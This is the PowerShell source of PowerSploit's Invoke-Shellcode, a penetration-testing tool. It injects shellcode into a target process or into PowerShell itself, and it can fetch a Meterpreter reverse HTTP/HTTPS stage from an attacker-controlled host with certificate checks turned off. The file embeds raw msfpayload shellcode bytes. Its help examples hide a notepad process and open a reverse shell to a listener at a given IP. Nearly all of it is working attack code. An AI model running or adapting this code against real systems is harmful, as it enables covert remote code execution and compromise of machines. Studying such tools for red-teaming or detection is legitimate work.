function Invoke-Shellcode
{
<#
.SYNOPSIS

Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.

PowerSploit Function: Invoke-Shellcode
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):

msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 

Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
 
.PARAMETER ProcessID

Process ID of the process you want to inject shellcode into.

.PARAMETER Shellcode

Specifies an optional shellcode passed in as a byte array

.PARAMETER ListMetasploitPayloads

Lists all of the available Metasploit payloads that Invoke-Shellcode supports

.PARAMETER Lhost

Specifies the IP address of the attack machine waiting to receive the reverse shell

.PARAMETER Lport
 
Specifies the port of the attack machine waiting to receive the reverse shell

.PARAMETER Payload

Specifies the metasploit payload to use. Currently, only 'windows/meterpreter/reverse_http' and 'windows/meterpreter/reverse_https' payloads are supported.

.PARAMETER UserAgent

Optionally specifies the user agent to use when using meterpreter http or https payloads

.PARAMETER Proxy

Optionally specifies whether to utilize the proxy settings on the machine.

.PARAMETER Legacy

Optionally specifies whether to utilize the older meterpreter handler "INITM". This will likely be removed in the future. 

.PARAMETER Force

Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.

.EXAMPLE

C:\PS> Invoke-Shellcode -ProcessId 4274

Description
-----------
Inject shellcode into process ID 4274.

.EXAMPLE

C:\PS> Invoke-Shellcode

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE

C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
C:\PS> $Proc = Get-Process notepad
C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose

VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
VERBOSE: Injecting shellcode into PID: 4004
VERBOSE: Injecting into a Wow64 process.
VERBOSE: Using 32-bit shellcode.
VERBOSE: Shellcode memory reserved at 0x03BE0000
VERBOSE: Emitting 32-bit assembly call stub.
VERBOSE: Thread call stub memory reserved at 0x001B0000
VERBOSE: Shellcode injection complete!

Description
-----------
Establishes a reverse https meterpreter payload from within the hidden notepad process. A multi-handler was set up with the following options:

Payload options (windows/meterpreter/reverse_https):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
LHOST     192.168.30.129   yes       The local listener hostname
LPORT     443              yes       The local listener port

.EXAMPLE

C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80

Description
-----------
Establishes a reverse http meterpreter payload from within the running PwerShell process. A multi-handler was set up with the following options:

Payload options (windows/meterpreter/reverse_http):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
LHOST     192.168.30.129   yes       The local listener hostname
LPORT     80               yes       The local listener port

.EXAMPLE

C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
    
Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
    
.EXAMPLE

C:\PS> Invoke-Shellcode -ListMetasploitPayloads
    
Payloads
--------
windows/meterpreter/reverse_http
windows/meterpreter/reverse_https

.NOTES

Use the '-Verbose' option to print detailed information.

Place your generated shellcode in $Shellcode32 and $Shellcode64 variables or pass it in as a byte array via the '-Shellcode' parameter

Big thanks to Oisin (x0n) Grehan (@oising) for answering all my obscure questions at the drop of a hat - http://www.nivot.org/

.LINK

http://www.exploit-monday.com
#>

[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    $ProcessID,
    
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateSet( 'windows/meterpreter/reverse_http',
                  'windows/meterpreter/reverse_https',
                  IgnoreCase = $True )]
    [String]
    $Payload = 'windows/meterpreter/reverse_http',
    
    [Parameter( ParameterSetName = 'ListPayloads' )]
    [Switch]
    $ListMetasploitPayloads,
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateNotNullOrEmpty()]
    [String]
    $Lhost = '127.0.0.1',
    
    [Parameter( Mandatory = $True,
                ParameterSetName = 'Metasploit' )]
    [ValidateRange( 1,65535 )]
    [Int]
    $Lport = 8443,
    
    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [String]
    $UserAgent = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').'User Agent',

    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $Legacy = $False,

    [Parameter( ParameterSetName = 'Metasploit' )]
    [ValidateNotNull()]
    [Switch]
    $Proxy = $False,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0
    
    # List all available Metasploit payloads and exit the function
    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
    {
        $AvailablePayloads = (Get-Command Invoke-Shellcode).Parameters['Payload'].Attributes |
            Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
    
        foreach ($Payload in $AvailablePayloads.ValidValues)
        {
            New-Object PSObject -Property @{ Payloads = $Payload }
        }
        
        Return
    }

    if ( $PSBoundParameters['ProcessID'] )
    {
        # Ensure a valid process ID was provided
        # This could have been validated via 'ValidateScript' but the error generated with Get-Process is more descriptive
        Get-Process -Id $ProcessID -ErrorAction Stop | Out-Null
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,
            
            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
        
        # Return the address of the function
        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
    }

    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
    function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
    {
        $IntSizePtr = $Architecture / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] $Address)
        {
            $LittleEndianByteArray = New-Object Byte[](0)
            $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
            [System.Array]::Reverse($LittleEndianByteArray)
            
            Write-Output $LittleEndianByteArray
        }
        
        $CallStub = New-Object Byte[](0)
        
        if ($IntSizePtr -eq 8)
        {
            [Byte[]] $CallStub = 0x48,0xB8                      # MOV   QWORD RAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  RAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0x48,0xB8                              # MOV   QWORD RAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  RAX
        }
        else
        {
            [Byte[]] $CallStub = 0xB8                           # MOV   DWORD EAX, &shellcode
            $CallStub += ConvertTo-LittleEndian $BaseAddr       # &shellcode
            $CallStub += 0xFF,0xD0                              # CALL  EAX
            $CallStub += 0x6A,0x00                              # PUSH  BYTE 0
            $CallStub += 0xB8                                   # MOV   DWORD EAX, &ExitThread
            $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
            $CallStub += 0xFF,0xD0                              # CALL  EAX
        }
        
        Write-Output $CallStub
    }

    function Local:Inject-RemoteShellcode ([Int] $ProcessID)
    {
        # Open a handle to the process you want to inject into
        $hProcess = $OpenProcess.Invoke(0x001F0FFF, $false, $ProcessID) # ProcessAccessFlags.All (0x001F0FFF)
        
        if (!$hProcess)
        {
            Throw "Unable to open a process handle for PID: $ProcessID"
        }

        $IsWow64 = $false

        if ($64bitCPU) # Only perform theses checks if CPU is 64-bit
        {
            # Determine is the process specified is 32 or 64 bit
            $IsWow64Process.Invoke($hProcess, [Ref] $IsWow64) | Out-Null
            
            if ((!$IsWow64) -and $PowerShell32bit)
            {
                Throw 'Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work.'
            }
            elseif ($IsWow64) # 32-bit Wow64 process
            {
                if ($Shellcode32.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode32 variable!'
                }
                
                $Shellcode = $Shellcode32
                Write-Verbose 'Injecting into a Wow64 process.'
                Write-Verbose 'Using 32-bit shellcode.'
            }
            else # 64-bit process
            {
                if ($Shellcode64.Length -eq 0)
                {
                    Throw 'No shellcode was placed in the $Shellcode64 variable!'
                }
                
                $Shellcode = $Shellcode64
                Write-Verbose 'Using 64-bit shellcode.'
            }
        }
        else # 32-bit CPU
        {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteMemAddr)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode into the previously allocated memory
        $WriteProcessMemory.Invoke($hProcess, $RemoteMemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) | Out-Null

        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread

        if ($IsWow64)
        {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate inline assembly stub
        $RemoteStubAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $CallStub.Length, 0x3000, 0x40) # (Reserve|Commit, RWX)
        
        if (!$RemoteStubAddr)
        {
            Throw "Unable to allocate thread call stub memory in PID: $ProcessID"
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))"

        # Write 32-bit assembly stub to remote process memory space
        $WriteProcessMemory.Invoke($hProcess, $RemoteStubAddr, $CallStub, $CallStub.Length, [Ref] 0) | Out-Null

        # Execute shellcode as a remote thread
        $ThreadHandle = $CreateRemoteThread.Invoke($hProcess, [IntPtr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, [IntPtr]::Zero)
        
        if (!$ThreadHandle)
        {
            Throw "Unable to launch remote thread in PID: $ProcessID"
        }

        # Close process handle
        $CloseHandle.Invoke($hProcess) | Out-Null

        Write-Verbose 'Shellcode injection complete!'
    }

    function Local:Inject-LocalShellcode
    {
        if ($PowerShell32bit) {
            if ($Shellcode32.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode32 variable!'
                return
            }
            
            $Shellcode = $Shellcode32
            Write-Verbose 'Using 32-bit shellcode.'
        }
        else
        {
            if ($Shellcode64.Length -eq 0)
            {
                Throw 'No shellcode was placed in the $Shellcode64 variable!'
                return
            }
            
            $Shellcode = $Shellcode64
            Write-Verbose 'Using 64-bit shellcode.'
        }
    
        # Allocate RWX memory for the shellcode
        $BaseAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$BaseAddress)
        {
            Throw "Unable to allocate shellcode memory in PID: $ProcessID"
        }
        
        Write-Verbose "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $BaseAddress, $Shellcode.Length)
        
        # Get address of ExitThread function
        $ExitThreadAddr = Get-ProcAddress kernel32.dll ExitThread
        
        if ($PowerShell32bit)
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
            
            Write-Verbose 'Emitting 32-bit assembly call stub.'
        }
        else
        {
            $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
            
            Write-Verbose 'Emitting 64-bit assembly call stub.'
        }

        # Allocate RWX memory for the thread call stub
        $CallStubAddress = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallStub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)
        if (!$CallStubAddress)
        {
            Throw "Unable to allocate thread call stub."
        }
        
        Write-Verbose "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))"

        # Copy call stub to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($CallStub, 0, $CallStubAddress, $CallStub.Length)

        # Launch shellcode in it's own thread
        $ThreadHandle = $CreateThread.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $BaseAddress, 0, [IntPtr]::Zero)
        if (!$ThreadHandle)
        {
            Throw "Unable to launch thread."
        }

        # Wait for shellcode thread to terminate
        $WaitForSingleObject.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
        
        $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
        $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)

        Write-Verbose 'Shellcode injection complete!'
    }

    # A valid pointer to IsWow64Process will be returned if CPU is 64-bit
    $IsWow64ProcessAddr = Get-ProcAddress kernel32.dll IsWow64Process
    if ($IsWow64ProcessAddr)
    {
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        
        $64bitCPU = $true
    }
    else
    {
        $64bitCPU = $false
    }

    if ([IntPtr]::Size -eq 4)
    {
        $PowerShell32bit = $true
    }
    else
    {
        $PowerShell32bit = $false
    }

    if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
    {
        if (!$PowerShell32bit) {
            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
            # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function

            # Pull out just the content of the this script's invocation.
            $RootInvocation = $MyInvocation.Line

            $Response = $True
        
            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                   "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
        
            if ( !$Response )
            {
                # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
                Return
            }

            # Since the shellcode will run in a noninteractive instance of PowerShell, make sure the -Force switch is included so that there is no warning prompt.
            if ($MyInvocation.BoundParameters['Force'])
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation)`n`n"
            }
            else
            {
                Write-Verbose "Executing the following from 32-bit PowerShell: $RootInvocation -Force"
                $Command = "function $($MyInvocation.InvocationName) {`n" + $MyInvocation.MyCommand.ScriptBlock + "`n}`n$($RootInvocation) -Force`n`n"
            }

            $CommandBytes = [System.Text.Encoding]::Ascii.GetBytes($Command)
            $EncodedCommand = [Convert]::ToBase64String($CommandBytes)

            $Execute = '$Command' + " | $Env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command -"
            Invoke-Expression -Command $Execute | Out-Null

            # Exit the script since the shellcode will be running from x86 PowerShell
            Return
        }
        
        $Response = $True
        
        if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
               "About to download Metasploit payload '$($Payload)' LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
        
        if ( !$Response )
        {
            # User opted not to carry out download of Metasploit payload. Exit function
            Return
        }
        
        switch ($Payload)
        {
            'windows/meterpreter/reverse_http'
            {
                $SSL = ''
            }
            
            'windows/meterpreter/reverse_https'
            {
                $SSL = 's'
                # Accept invalid certificates
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$True}
            }
        }
        
        if ($Legacy) 
        {
            # Old Meterpreter handler expects 'INITM' in the URI in order to initiate stage 0
            $Request = "http$($SSL)://$($Lhost):$($Lport)/INITM"
            Write-Verbose "Requesting meterpreter payload from $Request"
        } else {

            # Generate a URI that passes the test
            $CharArray = 48..57 + 65..90 + 97..122 | ForEach-Object {[Char]$_}
            $SumTest = $False

            while ($SumTest -eq $False) 
            {
                $GeneratedUri = $CharArray | Get-Random -Count 4
                $SumTest = (([int[]] $GeneratedUri | Measure-Object -Sum).Sum % 0x100 -eq 92)
            }

            $RequestUri = -join $GeneratedUri

            $Request = "http$($SSL)://$($Lhost):$($Lport)/$($RequestUri)" 
        }
           
        $Uri = New-Object Uri($Request)
        $WebClient = New-Object System.Net.WebClient
        $WebClient.Headers.Add('user-agent', "$UserAgent")
        
        if ($Proxy)
        {
            $WebProxyObject = New-Object System.Net.WebProxy
            $ProxyAddress = (Get-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings').ProxyServer
            
            # if there is no proxy set, then continue without it
            if ($ProxyAddress) 
            {
            
                $WebProxyObject.Address = $ProxyAddress
                $WebProxyObject.UseDefaultCredentials = $True
                $WebClientObject.Proxy = $WebProxyObject
            }
        }

        try
        {
            [Byte[]] $Shellcode32 = $WebClient.DownloadData($Uri)
        }
        catch
        {
            Throw "$($Error[0].Exception.InnerException.InnerException.Message)"
        }
        [Byte[]] $Shellcode64 = $Shellcode32

    }
    elseif ($PSBoundParameters['Shellcode'])
    {
        # Users passing in shellcode  through the '-Shellcode' parameter are responsible for ensuring it targets
        # the correct architechture - x86 vs. x64. This script has no way to validate what you provide it.
        [Byte[]] $Shellcode32 = $Shellcode
        [Byte[]] $Shellcode64 = $Shellcode32
    }
    else
    {
        # Pop a calc... or whatever shellcode you decide to place in here
        # I sincerely hope you trust that this shellcode actually pops a calc...
        # Insert your shellcode here in the for 0xXX,0xXX,...
        # 32-bit payload
        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
        [Byte[]] $Shellcode32 = 0xd9,0xcf,0xba,0xcd,0x4a,0xb4,0x5c,0xd9,0x74,0x24
$Shellcode32 += 0xf4,0x5e,0x29,0xc9,0xb1,0x59,0x31,0x56,0x18,0x83
$Shellcode32 += 0xee,0xfc,0x3,0x56,0xd9,0xa8,0x41,0x85,0x2b,0xf5
$Shellcode32 += 0xde,0x12,0x5f,0x5c,0x34,0x92,0x2e,0x33,0xf4,0xaa
$Shellcode32 += 0x68,0xeb,0xb0,0x30,0x62,0xef,0xf0,0x44,0x67,0x13
$Shellcode32 += 0x81,0xbd,0xeb,0xde,0xe0,0xd3,0x38,0x30,0x3,0x77
$Shellcode32 += 0xb2,0x45,0xae,0xcd,0x6c,0xf9,0xfd,0x82,0x87,0x28
$Shellcode32 += 0x87,0xf,0x8a,0x82,0x38,0x9d,0xc6,0x87,0x85,0xc3
$Shellcode32 += 0x79,0x82,0xc,0x7,0xe9,0xf4,0xdd,0x86,0x19,0xa9
$Shellcode32 += 0x66,0x54,0xcd,0x5b,0x97,0x7f,0xa2,0xbd,0xd0,0xd4
$Shellcode32 += 0x8a,0x62,0x8d,0x95,0xaf,0x65,0x41,0x18,0xd1,0xa4
$Shellcode32 += 0xfe,0xc1,0xfa,0x7f,0xb5,0xea,0x38,0xbd,0x47,0xe3
$Shellcode32 += 0xfc,0x17,0xad,0xc6,0xce,0x73,0x66,0x3a,0xbc,0xb4
$Shellcode32 += 0x30,0x59,0xea,0x15,0x44,0xef,0x58,0x76,0xc4,0xc7
$Shellcode32 += 0x77,0x1,0xd7,0xdc,0x5,0xfc,0x67,0x1a,0x7d,0x86
$Shellcode32 += 0xac,0xfa,0xf2,0x3c,0x97,0x46,0x99,0x63,0xe4,0x8
$Shellcode32 += 0x98,0xf2,0x18,0xf1,0xca,0x61,0xb5,0x26,0x54,0x7b
$Shellcode32 += 0xd4,0x54,0x70,0x15,0xc2,0x98,0xc7,0x49,0x5c,0xd6
$Shellcode32 += 0x93,0xb7,0xa,0x28,0xc4,0xc3,0x1f,0x15,0xe7,0xb1
$Shellcode32 += 0x77,0x14,0xb1,0x9,0xe8,0xf0,0xb3,0x27,0x80,0xe1
$Shellcode32 += 0x9,0x43,0x96,0x65,0xfa,0xf2,0x23,0x23,0x51,0x5f
$Shellcode32 += 0xc6,0xbb,0x76,0x13,0xf0,0x16,0x4c,0x93,0xe1,0x1
$Shellcode32 += 0xb7,0x8d,0xe0,0x8d,0x8e,0xf9,0x7,0xf2,0xd5,0x1e
$Shellcode32 += 0x8f,0x86,0xf6,0x71,0x42,0x63,0x3d,0xaa,0xc9,0x14
$Shellcode32 += 0x8a,0x63,0x49,0x4a,0x8d,0xb,0x58,0x95,0xbd,0xe5
$Shellcode32 += 0xd6,0xbf,0x24,0xaa,0x42,0xe9,0x3a,0x96,0x8b,0xcd
$Shellcode32 += 0xd3,0x8c,0x53,0x41,0xae,0x54,0x38,0x8c,0x96,0x51
$Shellcode32 += 0x97,0xeb,0x6d,0x7f,0xd8,0x52,0x4f,0x4e,0xa1,0x59
$Shellcode32 += 0x31,0xba,0x80,0x70,0xe4,0x71,0x93,0x51,0x91,0x73
$Shellcode32 += 0xf0,0xf4,0xb1,0xff,0x76,0x2d,0x10,0xd5,0x5e,0x1d
$Shellcode32 += 0xa3,0xc7,0x14,0x4a,0x83,0xdc,0x23,0x57,0x9b,0x94
$Shellcode32 += 0xdf,0x16,0x9d,0x6d,0x90,0xd3,0x60,0xdd,0x9,0xb
$Shellcode32 += 0xbc,0x3a,0x92,0xb9,0x99,0x3e,0xb3,0xc8,0x2,0xe
$Shellcode32 += 0x17,0xc6,0xd3,0xcf,0x5c,0x24,0xc6,0x96,0xf,0xb9
$Shellcode32 += 0x2b,0xf7,0x3b,0xb2,0xbc,0x5b,0x9f,0x5,0xe5,0xd2
$Shellcode32 += 0xee,0x7d,0xb1,0x7b,0xae,0x9c,0x92,0x66,0xb7,0xef
$Shellcode32 += 0x11,0xae,0xc6,0xc9,0x48,0xfa,0xd4,0xf1,0x20,0x3a
$Shellcode32 += 0xec,0x21,0xd4,0x2e,0xce,0x6f,0x58,0x10,0x27,0x27


        # 64-bit payload
        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
        [Byte[]] $Shellcode64 = 0x48,0x31,0xc9,0x48,0x81,0xe9,0xc3,0xff,0xff,0xff
$Shellcode64 += 0x48,0x8d,0x5,0xef,0xff,0xff,0xff,0x48,0xbb,0x8b
$Shellcode64 += 0x1,0x84,0x9c,0x35,0x5e,0x46,0x60,0x48,0x31,0x58
$Shellcode64 += 0x27,0x48,0x2d,0xf8,0xff,0xff,0xff,0xe2,0xf4,0x77
$Shellcode64 += 0x49,0x5,0x78,0xc5,0xa1,0xb9,0x9f,0x63,0xcd,0x84
$Shellcode64 += 0x9c,0x35,0x1f,0x17,0x21,0xdb,0x53,0xd5,0xca,0x7d
$Shellcode64 += 0x6f,0x94,0x5,0xc3,0x8a,0xd6,0xfc,0x7d,0xd5,0x14
$Shellcode64 += 0x78,0xc3,0x8a,0xd6,0xbc,0x7d,0xd5,0x34,0x30,0xc3
$Shellcode64 += 0xe,0x33,0xd6,0x7f,0x13,0x77,0xa9,0xc3,0x30,0x44
$Shellcode64 += 0x30,0x9,0x3f,0x3a,0x62,0xa7,0x21,0xc5,0x5d,0xfc
$Shellcode64 += 0x53,0x7,0x61,0x4a,0xe3,0x69,0xce,0x74,0xf,0xe
$Shellcode64 += 0xeb,0xd9,0x21,0xf,0xde,0x9,0x16,0x47,0xb0,0xed
$Shellcode64 += 0x80,0xfc,0x84,0x3e,0x5c,0x49,0xe5,0xf9,0x1,0x84
$Shellcode64 += 0x9c,0xbe,0xde,0xce,0x60,0x8b,0x1,0xcc,0x19,0xf5
$Shellcode64 += 0x2a,0x21,0x28,0x8a,0xd1,0xd4,0x17,0x7d,0x46,0x2
$Shellcode64 += 0xeb,0xcb,0x21,0xcd,0x9d,0xe5,0xbd,0x10,0x28,0x74
$Shellcode64 += 0xc8,0xc5,0x17,0x1,0xd6,0xe,0x61,0x5d,0x4c,0xb5
$Shellcode64 += 0x55,0x7d,0x6f,0x86,0xcc,0xca,0xc0,0x4d,0x91,0x74
$Shellcode64 += 0x5f,0x87,0x58,0x6b,0x74,0x75,0xd0,0x36,0x12,0x62
$Shellcode64 += 0x68,0xce,0x38,0x55,0xe9,0xed,0x6,0x2,0xeb,0xcb
$Shellcode64 += 0x25,0xcd,0x9d,0xe5,0x38,0x7,0xeb,0x87,0x49,0xc0
$Shellcode64 += 0x17,0x75,0x42,0xf,0x61,0x5b,0x40,0xf,0x98,0xbd
$Shellcode64 += 0x16,0x47,0xb0,0xca,0x59,0xc5,0xc4,0x6b,0x7,0x1c
$Shellcode64 += 0x21,0xd3,0x40,0xdd,0xdd,0x6f,0x16,0xc5,0x8c,0xab
$Shellcode64 += 0x40,0xd6,0x63,0xd5,0x6,0x7,0x39,0xd1,0x49,0xf
$Shellcode64 += 0x8e,0xdc,0x15,0xb9,0x9f,0x74,0x5c,0xcd,0x22,0x42
$Shellcode64 += 0x2d,0x74,0x3f,0xb8,0x33,0x84,0x9c,0x74,0x8,0xf
$Shellcode64 += 0xe9,0x6d,0x49,0x5,0x70,0x95,0x5f,0x46,0x60,0xc2
$Shellcode64 += 0x88,0x61,0xd4,0x4,0x9e,0x16,0x30,0xc2,0xc6,0x40
$Shellcode64 += 0x9e,0x35,0x4f,0x1a,0x21,0xdf,0x48,0xd,0x78,0x79
$Shellcode64 += 0xd7,0xb7,0x21,0x31,0x4d,0xf3,0xba,0x32,0xa1,0x93
$Shellcode64 += 0x2c,0x2,0xeb,0xec,0x9d,0x34,0x5e,0x46,0x39,0xca
$Shellcode64 += 0xbb,0xad,0x1c,0x5e,0x5e,0xb9,0xb5,0xe1,0x3,0xdd
$Shellcode64 += 0xcc,0x65,0x13,0x77,0xa9,0xc6,0x30,0x44,0xd4,0xca
$Shellcode64 += 0x9e,0xe,0xe9,0x49,0x40,0x3e,0x76,0x3a,0x81,0xa6
$Shellcode64 += 0x9f,0x5e,0x49,0xd,0x5b,0x5f,0x4e,0x7,0x38,0xc7
$Shellcode64 += 0x88,0x66,0xd4,0xbc,0xa7,0x7,0xda,0x49,0xda,0xb3
